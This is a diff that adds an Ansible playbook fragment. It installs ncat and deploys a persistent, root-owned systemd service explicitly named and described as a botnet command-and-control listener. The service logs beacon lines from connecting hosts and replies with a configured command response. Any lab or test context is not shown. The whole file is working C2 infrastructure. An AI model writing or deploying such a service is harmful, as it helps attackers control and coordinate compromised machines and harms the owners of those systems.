@@ -1,0 +1,41 @@
+---
+- name: Install ncat
+  apt:
+    name: ncat
+    state: present
+    update_cache: yes
+
+- name: Ensure C2 log directory exists
+  file:
+    path: "{{ beacon_log | dirname }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+- name: Create C2 listener service
+  copy:
+    dest: /etc/systemd/system/botnet-c2-listener.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Botnet C2 command-and-control listener
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/bin/sh -c 'ncat -lk {{ listen_port }} -c "read line; echo \"$(date -Is) $line\" >> {{ beacon_log }}; echo {{ c2_response | quote }}" >> {{ beacon_log }} 2>&1'
+      Restart=always
+      RestartSec=2
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Enable and start C2 listener
+  systemd:
+    name: botnet-c2-listener.service
+    enabled: yes
+    state: started
+    daemon_reload: yes
